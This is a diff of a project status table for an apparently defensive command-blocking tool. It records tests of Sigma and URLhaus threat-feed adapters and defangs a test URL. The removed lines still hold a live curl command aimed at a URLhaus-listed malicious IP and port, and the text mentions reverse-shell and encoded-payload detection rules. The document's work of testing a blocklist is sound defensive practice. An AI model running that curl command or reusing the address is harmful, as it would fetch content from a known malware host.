@@ -81,11 +81,11 @@ headless enforce: `[BLOCKED] command-shapes feed (Sigma): Linux Base64 Encoded P
 
 | F6 | Sigma `linux/process_creation` adapter → command shapes, **monitor**; `blitzpi report` shows hit counts per rule so FP rate is measurable before enforce | AD-1 | med | reverse-shell command → audited; a normal `bun test` → silent |
 **F7 status 2026-08-30: built and verified live — user confirmation needed.** `feeds update` → `urls updated 15752 rules 1288 KB
-sha256 8e5ccc05…` ✔ · `feeds scan "curl http://115.55.191.42:44132/i"` → *listed URL (URLhaus)*; a `raw.githubusercontent.com`
+sha256 8e5ccc05…` ✔ · `feeds scan "curl hxxp://115[.]55[.]191[.]42:44132/i"` (defanged here — never write a listed URL into a file) → *listed URL (URLhaus)*; a `raw.githubusercontent.com`
 README URL → nothing flagged ✔ · headless monitor (`echo <listed>`, no request made): audit `feed_url mode:monitor allowed:true
 kind:url` ✔ · headless enforce (`curl -sI <listed>`): `[BLOCKED] URL feed (URLhaus): … (listed URL). The command did not run.`,
 **0** `bash_exec` entries in that session ✔ · TUI: `urls urlhaus (monitor)`, `Malicious URLs (URLhaus)` row ✔ · report ledger
-`url:115.55.191.42` ✔ · installer smoke **54/54** (one earlier run failed in the platform install step from a transient download
+`url:115[.]55[.]191[.]42` ✔ · installer smoke **54/54** (one earlier run failed in the platform install step from a transient download
 error and passed unchanged on re-run) · Jest 163 passed ✔. Found + fixed while verifying: the real list has no comment header —
 the adapter's header guard refused the genuine feed; replaced by a structural check (≥100 entries, ≥90% http(s) URLs).
 
